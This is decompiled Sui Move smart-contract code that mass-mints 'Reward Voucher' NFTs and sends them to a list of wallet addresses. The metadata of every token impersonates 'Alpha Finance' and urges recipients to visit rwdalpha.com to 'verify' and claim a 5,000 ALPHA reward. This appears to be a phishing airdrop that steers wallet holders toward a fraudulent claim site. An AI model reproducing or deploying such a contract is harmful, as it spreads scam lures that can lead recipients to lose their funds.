module 0x455132d86503462437ed90e9164d0ebd9dfd9dc6978fd9a071fdd1e25c865a3e::reward1202 {
    struct REWARD1202 has drop {
        dummy_field: bool,
    }

    struct TICKET_1202 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward1202(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_1202{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729868566/rwdalphacom_1025_2_spqfjo.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 ALPHA"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_1202>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729868566/rwdalphacom_1025_2_spqfjo.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 ALPHA"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_1202>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD1202, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Voucher"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729868566/rwdalphacom_1025_2_spqfjo.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdalpha.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Alpha Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"5,000 ALPHA"));
        let v4 = 0x2::package::claim<REWARD1202>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_1202>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_1202>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_1202>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

